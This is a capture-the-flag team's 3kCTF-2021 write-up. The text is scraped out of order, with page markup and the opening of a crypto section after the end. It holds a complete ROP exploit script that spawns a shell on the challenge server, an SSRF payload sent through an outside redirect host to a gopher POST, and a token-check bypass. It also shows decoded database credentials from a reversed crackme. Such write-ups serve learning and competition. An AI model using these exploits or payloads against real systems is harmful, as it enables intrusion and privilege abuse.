binary.\n──(bot3310㉿kali)-[~/Downloads/3kCTF/masterc/bin] └─$ checksec masterc [*] '/home/bot3310/Downloads/3kCTF/masterc/bin/masterc' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled This binary has enabled all the protections. We are also given a C source code of the binary file. After analyzing the source code, we found win is vulnerable to ROP.\nvoid win() { char buf[0x10]; puts(\" \"); gets(buf); } Then, we found that we can leak PIE base in play_game.\nunsigned long play_game() { static int counter; unsigned long r, guess; r = rand(); printf(\"Enter your guess : \"); get_ul(\u0026guess); if(r == guess) { printf(\"win!\\n\"); win(); } if(counter == max_tries-1) { printf(\"Sorry, that was the last guess!\\n\"); printf(\"You entered %lu but the right number was %lu\\n\", guess, r); return r; } counter++; return r; } The guess variable has not initialized at the beginning, it will be initialized by our input in get_u1. However get_u1 uses scanf(\"%lu\", num) to get our input.\nvoid get_ul(unsigned long* num) { fflush(stdout); scanf(\"%lu\", num); readuntil('\\n'); } %lu represents a unsigned long number, if we input a character, the guess will not be initialized successfully. If we input 1 as the guess number, the stack will be:\n0x00007fffffffdd80│+0x0000: 0x00007fffffffdda0 → 0x00007fffffffdde0 → 0x0000555555555730 →  endbr64 ← $rsp 0x00007fffffffdd88│+0x0008: 0x0000000000000001 0x00007fffffffdd90│+0x0010: 0x000000004b4bb6e3 0x00007fffffffdd98│+0x0018: 0x5c724145e4937e00 0x00007fffffffdda0│+0x0020: 0x00007fffffffdde0 → 0x0000555555555730 →  endbr64 ← $rbp We can see our guess number is store in rsp+0x8. If we input A as the guess number, the stack will be:\n0x00007fffffffdd80│+0x0000: 0x00007fffffffdda0 → 0x00007fffffffdde0 → 0x0000555555555730 →  endbr64 ← $rsp 0x00007fffffffdd88│+0x0008: 0x0000555555555579 →  mov DWORD PTR [rbp-0x4], eax 0x00007fffffffdd90│+0x0010: 0x0000000051831fd3 0x00007fffffffdd98│+0x0018: 0x44282bb265056400 0x00007fffffffdda0│+0x0020: 0x00007fffffffdde0 → 0x0000555555555730 →  endbr64 ← $rbp In rsp+0x8, there is the address of  instead of the guess number because the guess variable has not initialized.\nAlso, in play_game, if there is the last try to guess, it will print out our guess number. Therefore, we can leak the address of  when we input a character as our guess.\nWe can get the base address for PIE after subtracting the offset of .\np.sendlineafter('size :', '1') p.sendlineafter('tries :', '1') p.sendlineafter('guess', 'A') # leak pie_base p.recvuntil('entered') leak = str(p.recvuntil('but')) leak = int(leak[3:-4]) pie_base = leak - 0x1579 print(\"pie_base:\", hex(pie_base)) Although we failed to guess that random number, we can still get into win but with pthread:\nprintf(\"I don't think you won the game if you made it until here ...\\n\"); printf(\"But maybe a threaded win can help?\\n\"); pthread_t tid; pthread_create(\u0026tid, NULL, (void*)win, NULL); pthread_join(tid, NULL); pthread_t will copy the tcbhead_t in stack for the new thread.\ntypedef struct { void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; // ... } tcbhead_t; At the end of function, canary will be compared to the stack_guard to avoid stack smashing. Since pthread is placed the tcbhed_t in stack, we can overwrite the stack_guard to ensure the sucess of canary checking. If we overwite the stack_guard to AAAAAAAA, we can also use AAAAAAAA to overwrite the canary value.\nNow, we can overflow unlimited buffer in win. We also have the PIE base address and avoid the canary check to fail. We can leak the libc base address with simple rop and return to win again.\n# leak libc_base win = pie_base + 0x1436 pop_rdi = pie_base + 0x0000000000001793 puts_got = pie_base + elf.got['puts'] puts_plt = pie_base + elf.plt['puts'] payload = b'A'*40 payload += p64(pop_rdi) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(win) payload += b'A' * 3000 # buffer big enough to overwrite the stack guard p.sendlineafter('' , payload) p.recv() leak_put = p.recv(6) libc_base = u64(leak_put.ljust(8, b'\\x00')) - libc.symbols['puts'] print('libc_base:', hex(libc_base)) Finally, we use syscall to get the shell:\nbinsh = libc_base + next(libc.search(b\"/bin/sh\")) # ret2libc syscall pop_rax = libc_base + 0x000000000004a550 pop_rdx = libc_base + 0x0000000000162866 pop_rsi = libc_base + 0x0000000000027529 syscall = libc_base + 0x000000000002584d payload = b'A'*40 payload += p64(pop_rax) payload += p64(0x3b) payload += p64(pop_rdi) payload += p64(binsh) payload += p64(pop_rdx) + p64(0) + p64(0) payload += p64(pop_rsi) + p64(0) payload += p64(syscall) p.sendlineafter('',payload) p.interactive()┌──(bot3310㉿kali)-[~/Downloads/3kCTF/masterc/bin] └─$ python3 exp.py remote [*] '/home/bot3310/Downloads/3kCTF/masterc/bin/masterc' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to masterc.2021.3k.ctf.to on port 9999: Done [*] '/home/bot3310/Downloads/3kCTF/masterc/bin/libc-2.31.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled pie_base: 0x559acce67000 libc_base: 0x7f51832bf000 [*] Switching to interactive mode $ ls bin dev flag.txt ld-2.31.so lib lib32 lib64 libc-2.31.so libx32 masterc usr $ cat flag.txt 3k{WH47_Pr3V3N7_Y0U_Fr0M_r0PP1N6_1F_Y0U_C4N_0V3rWr173_7H3_M4573r_C4N4rY_17531F} This is the final exploit:\nfrom pwn import * TARGET = './masterc' HOST = 'masterc.2021.3k.ctf.to' PORT = 9999 context.arch = 'amd64' # i386 / amd64 #context.log_level = 'debug' elf = ELF(TARGET) if len(sys.argv)  1 and sys.argv[1] == 'remote': p = remote(HOST, PORT) libc = ELF('./libc-2.31.so') else: p = process(TARGET) libc = elf.libc #--- #gdb.attach(p, gdbscript='b *win+56') p.sendlineafter('size :', '1') p.sendlineafter('tries :', '1') p.sendlineafter('guess', 'A') # leak pie_base p.recvuntil('entered') leak = str(p.recvuntil('but')) leak = int(leak[3:-4]) pie_base = leak - 0x1579 print(\"pie_base:\", hex(pie_base)) # leak libc_base win = pie_base + 0x1436 pop_rdi = pie_base + 0x0000000000001793 puts_got = pie_base + elf.got['puts'] puts_plt = pie_base + elf.plt['puts'] payload = b'A'*40 payload += p64(pop_rdi) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(win) payload += b'A' * 3000 # buffer big enough to overwrite the stack guard p.sendlineafter('' , payload) p.recv() leak_put = p.recv(6) libc_base = u64(leak_put.ljust(8, b'\\x00')) - libc.symbols['puts'] print('libc_base:', hex(libc_base)) binsh = libc_base + next(libc.search(b\"/bin/sh\")) # ret2libc syscall pop_rax = libc_base + 0x000000000004a550 pop_rdx = libc_base + 0x0000000000162866 pop_rsi = libc_base + 0x0000000000027529 syscall = libc_base + 0x000000000002584d payload = b'A'*40 payload += p64(pop_rax) payload += p64(0x3b) payload += p64(pop_rdi) payload += p64(binsh) payload += p64(pop_rdx) + p64(0) + p64(0) payload += p64(pop_rsi) + p64(0) payload += p64(syscall) p.sendlineafter('',payload) p.interactive() ppaste (Web; 498 points) Solved by ozetta.\nWell, you only get 498 points instead of 500 points if you are the only solver.\nThe first part of this challenge is to get an account (otherwise you can't create a note a play with the PDF stuff).\n$checkInvite = @json_decode(@qInternal(\"invites\",json_encode(array(\"invite\"=$data['d']['invite']))),true); My first thought was having a 512 depth array as the invitation code to corrupt the json_encode. But the input got a length limitation. After a while, our teammate apple has registered an account successfully with an unknown payload. For some unknown reason I cannot reproduce his payload. But anyway we tried the second part of the challenge, which is to exploit the TCPDF to leak the flag. But it is not very successful because the space in the title field was removed and the content is sanitized.\n$data['d']['title'] = preg_replace(\"/\\s+/\", \"\", $data['d']['title']); // ... $html = ''.$tP['title'].'\n'.str_repeat(\"-\", 40).''.htmlentities($tP['content'],ENT_QUOTES).''; apple also tried the special tag , which could be used for code execution10, but unfortunately it is not enabled by default.\nLet's review the first part. We managed to find some other payload that corrupts the JSON input in Python. Then I found that a sufficiently large number like 3e333 will result in INF in PHP, which is invalid in Python. But it could not be used to bypass the invitation code and apple found that it is because INF's string length is 3, which is less than 4 and fails in a checking condition.\nforeach ($data['d'] as $key = $value) { if(strlen($value)4) puts(0); } Then we changed the payload to negative infinity like -3e333 and managed to bypass the restriction.\nFor the TCPDF part, we have to review the source code, which is unpleasantly long:\nhttps://raw.githubusercontent.com/the3000org/3kCTF2021/master/web/ppaste/source/www/TCPDF/tcpdf.php\nand my computer crashes when I view in Github directly. 🥳\nAnyway, the vulnerability is in the getHtmlDomArray function:\nprotected function getHtmlDomArray($html) { // array of CSS styles ( selector = properties).  $css = array(); // get CSS array defined at previous call  $matches = array(); if (preg_match_all('/([^\\/isU', $html, $matches)  0) { if (isset($matches[1][0])) { $css = array_merge($css, json_decode($this-unhtmlentities($matches[1][0]), true)); } $html = preg_replace('/(.*?)/isU', '', $html); } // extract external CSS files  $matches = array(); if (preg_match_all('/]*)/isU', $html, $matches)  0) { foreach ($matches[1] as $key = $link) { $type = array(); if (preg_match('/type[\\s]*=[\\s]*\"text\\/css\"/', $link, $type)) { $type = array(); preg_match('/media[\\s]*=[\\s]*\"([^\"]*)\"/', $link, $type); // get 'all' and 'print' media, other media types are discarded  // (all, braille, embossed, handheld, print, projection, screen, speech, tty, tv)  if (empty($type) OR (isset($type[1]) AND (($type[1] == 'all') OR ($type[1] == 'print')))) { $type = array(); if (preg_match('/href[\\s]*=[\\s]*\"([^\"]*)\"/', $link, $type)  0) { // read CSS data file  $cssdata = TCPDF_STATIC::fileGetContents(trim($type[1])); if (($cssdata !== FALSE) AND (strlen($cssdata)  0)) { $css = array_merge($css, TCPDF_STATIC::extractCSSproperties($cssdata)); } } } } } } Interestingly, the parsing for the link tag  does not require the space in between. So  also works. And TCPDF_STATIC::fileGetContents will call curl eventually:\nhttps://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1898\nGreat we got SSRF! The payload to verify it is . You should see the User-Agent is tc-lib-file.\nThen I try to leak the information downloaded as a part of CSS, which will be stored in a special tag  later. It looks possible to leak the flag because of the flag format:\n\nLater we found that there is a function in the internal service to set a user's privilege to admin:\n@app.route('/users', methods=['GET', 'POST']) def users(): if request.method == 'POST': myJson = json.loads(request.data) if(myJson['user']): qDB(\"UPDATE users SET priv=not(priv) WHERE user=? \",\"setAdmin\",myJson['user']) return json.dumps(True) else: return json.dumps(False) return json.dumps(qDB(\"SELECT user,priv FROM users\")) But it requires POST... After a while I found the curl used before will accept redirection:\nhttps://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1969\nSo we can use the redirect trick to SSRF a gopher to POST in internal service. Then I spent some significant time to handcraft the payload and got it wrong several times because of the encoding issue 🙈.\nAnyway here is the final payload to put in the note's title:\nlinktype=\"text/css\"href=\"http://poc.mm2.in/302.php?1=gopher%3A%2F%2F127.0.0.1%3A8082%2F_POST%2520%2Fusers%2520HTTP%2F1.1%250d%250aContent-type%3A%2520application%2Fjson%250d%250aContent-length%3A%252019%250d%250aHost%3A%2520127.0.0.1%3A8082%250d%250a%250d%250a%7B%22user%22%3A%22USERNAME%22%7D%250d%250a\" Then generate a pdf for this note will trigger SSRF, and then visit the admin page will get the flag.\n3K_SIGNER (Web; 495 points) Solved by ozetta.\nThis challenge got a lot of unpleasant API calls. So I write some fetches:\n// Registration fetch('/register',{method:'POST',headers:{'Content-type':'application/json'},body:JSON.stringify( {name:\"1\",password:\"2\"} )}).then(x=x.text()).then(x=console.log(x)) // Login fetch('/login',{method:'POST',headers:{'Content-type':'application/json','Authorization':'Basic '+btoa('1:2')},body:JSON.stringify( {name:\"1\",password:\"2\"} )}).then(x=x.text()).then(x=console.log(x)) // Call API with token fetch('/users',{method:'GET',headers:{'Content-type':'application/json','Authorization':'Basic '+btoa('1:2'),'x-access-tokens':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiJmZmZkYzgzOS01YzJhLTQ1OTMtYWUxMy01Mzk1YjNNjYwODciLCJleHAiOjE2MjExMzczNDN9.mceCURiA0IuRWfVbgxvfYvSKgmLQDC-Di0DE1mzBdsQ'}}).then(x=x.text()).then(x=console.log(x)) The objective is to call sign_pdf to trigger unoconv. But how to get a signed token without admin right? Mystiz got a good eyesight on the checking function instead:\nreg = re.compile(\"[0-9a_f]{32}\\Z\", re.I) def check_valid_token(intoken): if bool(reg.match(intoken)): rez=Tokens.query.filter(Tokens.token.ilike(intoken)).first() print(rez) if rez: return True else: return False else: return False For some unknown reason it uses case-insensitive like for checking and the regular expression contains _. So '_'*32 would be a valid token.\nNow we can play with the converter. This is similar to my previous challenges LibVOrifice and Conversion Center. Apparently the old payload =WEBSERVICE() did not work. To exploit unoconv we can refer to this more recent research11. The Postscript payload seems not working, but the OLE Object xLinking works well.\nI later on found that the CTF was ending soon (less than 30 minutes left) after I solved the challenge. That makes me look like flag hoarding, but no 🤫.\n\nOur teammates were working on Password Manager, and almost got the flag (missed one character). When they saw the bot message they thought their challenge was solved, but no 😒.\nPassword Manager (Reverse; 493 points) Solved by Mystiz, harrier and cdemirer.\nWe are given an archive file with password_manager.exe, log.dat and a bunch of .dll files. As a slightly seasoned reverse engineer, we knew password_manager.exe is the file the challenge. harrier searched about the .dlls online and found Renci.SshNet.dll is a .NET library for SSH - which he implied that the binary is written in .NET.\nPart I. Getting Started Since no one is working on this challenge, I decided to have a try on the challenge because I think .NET is not difficult to play with. To begin, I spun up my dusted Windows machine and load the binary with dnSpy. The taskQuals namespace caught my attention. For example, this is part of the eval_c inside the namespace:\n// Token: 0x0600002C RID: 44 RVA: 0x00003F10 File Offset: 0x00002110 private void eval_c(object A_0, EventArgs A_1) { int a_ = 14; short num = (short)1021706240; int num2 = (int)num; switch (num2) { default: { num = (short)2018443264; // Omitted...  for (;;) { // Omitted...  switch (num2) { // Omitted...  case 15: { string text4 = Form1.b(\"鯇迉胋词鏏蛑ﳕ볙껛뇝跟싡\", a_); char value3; text4 = text4 + Conversions.ToString(value3) + Form1.b(\"\", a_); MySqlCommand mySqlCommand = new MySqlCommand(text4, mySqlConnection); text += Convert.ToString(RuntimeHelpers.GetObjectValue(mySqlCommand.ExecuteScalar())); num = (short)1661272070; num2 = (int)((IntPtr)num); continue; } // Omitted...  } IL_24B: text5 = Form1.b(\"꫇ꯉ꿋꫍뗏듑돓뻕뇗냙럛닝跟賡诣雥駧飩鿫髭藯蓱菳軵臷胹뷻볽䏿䘁䄃䀅伇䈉䔋䐍嬏帑夓堕圗䨙䴛䰝猟瘡焣瀥缧爩甫琭\", a_); text2 = Form1.b(\"﯉ﻋ﷍﷛﷝쓟쟡싣쳥엧쇩싫틭컯쿱듳짵\", a_); dictionary = new Dictionarystring, string(); dictionary.Add(Form1.b(\"\", a_), Form1.b(\"\", a_)); dictionary.Add(Form1.b(\"\", a_), Form1.b(\"\", a_)); // Omitted...  dictionary.Add(Form1.b(\"\", a_), Form1.b(\"\", a_)); dictionary.Add(Form1.b(\"裇\", a_), Form1.b(\"難\", a_)); string connectionString = Form1.b(\"믇꿉뻋룍뗏ꃑ헟쳡틣헥웧틩퓫헭藯臱釳蓵엷釹駻賽狿洁㼃戅椇縉洋氍焏愑焓⬕猗缙眛┝借䴡嘣別ᔧᤩἫḭدऱ䐳圵䬷䤹䬻儽㈿♁祃ⵅⵇ㡉㹋⅍歏\", a_); mySqlConnection = new MySqlConnection(connectionString); mySqlConnection.Open(); string text6 = this.input.Text; // Omitted...  } return; IL_B0: value2 = Form1.b(\"诇韛볋韍뷏\", a_); num = (short)185991170; num2 = (int)((IntPtr)num); goto IL_59; } } } It seemed to me that the program is obfuscated in a similar way Layer did - num2 is the state and it controls the code block to be executed by switch. There are some interesting snippets, for instance, the below snippet should result in connecting to a MySQL database:\nstring connectionString = Form1.b(\"믇꿉뻋룍뗏ꃑ헟쳡틣헥웧틩퓫헭藯臱釳蓵엷釹駻賽狿洁㼃戅椇縉洋氍焏愑焓⬕猗缙眛┝借䴡嘣別ᔧᤩἫḭدऱ䐳圵䬷䤹䬻儽㈿♁祃ⵅⵇ㡉㹋⅍歏\", a_); mySqlConnection = new MySqlConnection(connectionString); mySqlConnection.Open(); As suggested, the gibberish inside Form1.b should represent a connection string. Let's look at the function.\nPart II. What is Form1.b hiding? // Token: 0x06000039 RID: 57 RVA: 0x00005844 File Offset: 0x00003A44 internal static string b(string A_0, int A_1) { char[] array = A_0.ToCharArray(); int num = (int)((IntPtr)(1681160370 + A_1) + (IntPtr)15 + (IntPtr)52 + (IntPtr)59 + (IntPtr)39 + (IntPtr)98); int num3; int num2; if ((num2 = (num3 = 0)) 1) { goto IL_6A; } IL_37: int num5; int num4 = num5 = num2; char[] array2 = array; int num6 = num5; char c = array[num5]; byte b = (byte)((int)(c \u0026 0xff) ^ num++); byte b2 = (byte)((int)(c  8) ^ num++); byte b3 = b2; b2 = b; b = b3; array2[num6] = (ushort)((int)b2 8 | (int)b); num3 = num4 + 1; IL_6A: if ((num2 = num3) = array.Length) { return string.Intern(new string(array)); } goto IL_37; } The above C# code has the same logic to the below Python function. Hence, we are able to decode the strings they obfuscated.\ndef form_a(x, b): offset = b+185 output = [] for j, xc in enumerate(x): output.append(((ord(xc)8) ^ (offset+2*j+1)) \u0026 0xff) return bytes(output).decode() For example, the connection string they used to connect to the MySQL server is decoded into below. We are now able to connect to the database ourselves!\nserver=159.65.63.88;user=kerro;database=kek;port=3306;password=kerro; Part III. Database-as-a-Encryption Service After connected to the database, I found that there are 52 tables, namely, a, b, ..., z, A, B, ..., Z. Interestingly, there is only one row in each of the tables. For example,\nmysql select * from a; +------+ | cont | +------+ | e | +------+ 1 row in set (0.24 sec) mysql select * from b; +------+ | cont | +------+ | f | +------+ 1 row in set (0.18 sec) It looks like a rotation on characters. From my sampled queries, I guess their corresponding input-output pairs are:\nINPUT | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ OUTPUT | efghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$% They are added to the dictionary. There are a number of key-value pairs being added to the dictionary. These are the pairs in the dictionary:\nINPUT | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026*-+.=@?0123456789 OUTPUT | efghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026*-+.=@?0123456789abcd After all, it is a ROT-4 cipher in the given character set - and the database is served as a part of the encryption mapping.\nWhere is this used? We will see.  Part IV. Recovering the additional binaries From the code, we have traces about a new binary is constructed and written to file1.exe:\nbinary_1 = new byte[] { 77, 90, 144, 0, 3, /* ...omitted... */ 116, 32, 98, 101 }; binary_2 = File.ReadAllBytes(\"./log.dat\"); byte[] final_array = binary_1.Concat(binary_2).ToArraybyte(); global::eval_c.eval_a.FileSystem.WriteAllBytes(\"./file1.exe\", final_binary, true); Since log.dat is attached, we are able to reconstruct file1.exe ourselves. There is a curious function in file1.exe when opened with IDA Pro: sub_1400013F0. It is a huge function, but most of the operations are simply value assignments:\nint __cdecl sub_1400013F0(int argc, const char **argv, const char **envp) { FILE *File; // ST20_8  char Str; // [rsp+30h] [rbp-186B8h]  char v6; // [rsp+31h] [rbp-186B7h]  char v7; // [rsp+32h] [rbp-186B6h]  char v8; // [rsp+33h] [rbp-186B5h]  // Omitted  Str = 77; v6 = 90; v7 = -112; v8 = 0; v9 = 3; // Omitted  v16384 = 0; v16385 = 0; v16386 = 0; v16387 = 0; v16388 = 0; memset(\u0026v16389, 0, 83616ui64); File = fopen(\"file.exe\", \"wb\"); fwrite(\u0026Str, 1ui64, 0x4000ui64, File); fclose(File); sub_140001000(\"./file.exe\"); return 0; It is pretty evident that there is another binary called file.exe, and we are able to build it from the above source code.\nPart V. Microsoft's Cryptographic Provider We are given the key the3kctfteamftw!! and 29 bytes of the ciphertext:\n5b d6 a5 3f f2 17 88 ed 47 d7 2c a1 a4 5e ff e7 e6 06 8c 99 a1 99 ee 6e 6f f8 4a b4 2c The cryptographic details in file.exe is pretty hairy. Since it is using Microsoft Enhanced RSA and AES Cryptographic Provider and there are no documentation, I don't know how did they derive the AES-key from the 17-byte seed key, nor the mode of operation they used. The only thing I knew is they used SHA256 to derive the AES-key and encrypt with AES128.\nHowever, I recalled that there is a challenge in Cyber Apocalypse 2021 that used Microsoft's API with SHA256 and AES128 too. Maybe we can refer to the write-ups? harrier referred me to the write-up12 that contain its Python implementation. Well... I better assume that is a black-box and modify the source code to fit my goal... Wait, what is it?\nPart VI. Understanding the Objective From file.exe, the objective is to find a message such that its the first 29 bytes of the ciphertext is given as 5b d6 a5 ... 4a b4 2c as specified above.\nNote. The code has an different checking condition checks if target_c[0] ^ c[0] ^ target_c[1] ^ c[1] ^ ... = 0. However, this loose condition is also enforced in the author’s remaining challenges Crackme and Layers. I think it is safe to assume that the real intention is target_c[i] == c[i] for all i’s…  The ciphertext comes from the clipboard, which is overwritten in password_manager.exe. There is an input box in the password manager. To copy something to the clipboard, one must have C0pYm3 copied in the clipboard. Otherwise the password manager will be closed. After that, the content in the input box will be encrypted with the ROT-4 cipher we mentioned in part III and will be copied to the clipboard. Hence, our objective is to find password that satisfies the below condition.\nAES128(ROT4(password), key)[:29] == target_ciphertext Since it is hard for me to switch to my Windows machine, I decide to patch the script and send it to harrier for me to run. There are some bugs and cdemirer helped fixing. Eventually, we are able to get it working. There are multiple candidates for the password. The most reasonable one is AsIOnc3Said!F4ceb00KIs3viL!=# - and we have the flag 20 minutes before the CTF ends!\n3k{AsIOnc3Said!F4ceb00KIs3viL!=#}  https://en.wikipedia.org/wiki/Rabin_cryptosystem#Decryption [return] https://www.w3.org/TR/REC-png-961001 [return] https://twitter.com/codexgigassys/status/765743255917125632 [return] https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm [return] http://factordb.com/index.php?id=1100000002583673291 [return] https://www.alpertron.com.ar/ECM.HTM [return] http://factordb.com/index.php?id=1100000002583690582 [return] http://factordb.com/index.php?id=1100000002583705568 [return] http://factordb.com/index.php?id=1100000002583719246 [return] https://tcpdf.org/examples/example_049/ [return] https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/ [return] https://ctftime.org/writeup/27932 [return]   ",
  "wordCount" : "10994",
  "inLanguage": "en",
  "image":"https://b6a.black/images/2021-05-22-3kctf/solves.png","datePublished": "2021-05-22T00:00:00+08:00",
  "dateModified": "2021-05-22T00:00:00+08:00",
  "author":[{
    "@type": "Person",
    "name": "bot_3310"
  }, {
    "@type": "Person",
    "name": "Mystiz"
  }, {
    "@type": "Person",
    "name": "ozetta"
  }, {
    "@type": "Person",
    "name": "TWY"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://b6a.black/posts/2021-05-22-3kctf/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Black Bauhinia",
    "logo": {
      "@type": "ImageObject",
      "url": "https://b6a.black/favicon.ico"
    }
  }
}
</script>



</head>

<body class=" dark" id="top">
<noscript>
    <style type="text/css">
        .theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
            <span class="logo-switches">
                
                
            </span>
        </div>
        <ul id="menu" onscroll="menu_on_scroll()">
            <li>
                <a href="https://b6a.black/about-us/" title="About Us">
                    <span>About Us</span>
                </a>
            </li></ul>
    </nav>
</header>

    <main class="main">

<article class="post-single">
  <header class="post-header">

    <h1 class="post-title">
      3kCTF-2021 Writeup
    </h1>
    <div class="post-meta">

May 22, 2021&nbsp;·&nbsp;bot_3310, Mystiz, ozetta, TWY

</div>
  </header>
  
  
  <div class="post-content js-toc-content">
<p><figure><img src="/images/2021-05-22-3kctf/scoreboard.png" alt=""></figure></p>

<p>We are united to play 3kCTF-2021 and result in the second place. In this blog post, we will walk through our solutions on the challenges solved.</p>

<h2 id="sms-crypto-435-points">SMS (Crypto; 435 points)<a hidden class="anchor" aria-hidden="true" href="#sms-crypto-435-points">#</a></h2>

<p>Solved by <em>Mystiz</em>.</p>

<p>We are given a hash algorithm called <em>SMS</em>. The algorithm itself is simple:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hash</span>(data):
	<span style="color:#66d9ef">assert</span> len(data) <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>

	state <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">9</span>)]
	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(data), <span style="color:#ae81ff">8</span>):
		block <span style="color:#f92672">=</span> data[i: i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]
		state <span style="color:#f92672">=</span> sub(state)
		state <span style="color:#f92672">=</span> mix(block, state)
		state <span style="color:#f92672">=</span> shift(state)

	state <span style="color:#f92672">=</span> sub(state)
	<span style="color:#66d9ef">return</span> bytes(state)<span style="color:#f92672">.</span>hex()</code></pre></div>
<p>The goal is to find a pair of inputs such that both digests are <code>00 00 00 00 00 00 00 00</code>. Also, the <code>sub</code>, <code>mix</code> and <code>shift</code> methods are short:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sub</span>(state):
    <span style="color:#66d9ef">return</span> [SBOX[x] <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> state]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mix</span>(block, state):
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
        state[i] <span style="color:#f92672">^=</span> block[<span style="color:#ae81ff">7</span> <span style="color:#f92672">-</span> i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1f</span>
        state[i] <span style="color:#f92672">^=</span> block[i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xe0</span>
    <span style="color:#66d9ef">return</span> state

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shift</span>(state):
    t <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> state:
        t <span style="color:#f92672">^=</span> s
    u <span style="color:#f92672">=</span> state[<span style="color:#ae81ff">0</span>]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
        state[i] <span style="color:#f92672">^=</span> t <span style="color:#f92672">^</span> state[i] <span style="color:#f92672">^</span> state[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
    state[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">^=</span> t <span style="color:#f92672">^</span> state[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">^</span> u
    <span style="color:#66d9ef">return</span> state</code></pre></div>
<p>We can implement the inverse functions for <code>sub</code> and <code>shift</code> (i.e., <code>unsub</code> and <code>unshift</code>) easily. With that said, we are able to recover a 8-byte input block with the below <code>recover_payload</code>, given the input and output states:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Find the 8-byte input block such that s -&gt; t after one round of SMS</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recover_payload</span>(s, t):
    <span style="color:#75715e"># t = shift(mix(x, sub(s))), where x is the input</span>
    u <span style="color:#f92672">=</span> sub(s[:])
    v <span style="color:#f92672">=</span> unshift(t[:])

    <span style="color:#75715e"># v = mix(x, u)</span>
    x <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>)]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
        x[  i] <span style="color:#f92672">^=</span> (u[i] <span style="color:#f92672">^</span> v[i]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xe0</span>
        x[<span style="color:#ae81ff">7</span><span style="color:#f92672">-</span>i] <span style="color:#f92672">^=</span> (u[i] <span style="color:#f92672">^</span> v[i]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1f</span>
    
    <span style="color:#66d9ef">return</span> x</code></pre></div>
<p>With the above function, it is not difficult to find a pair of messages such that they both hash to eight null bytes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">t <span style="color:#f92672">=</span> unsub([<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>)])

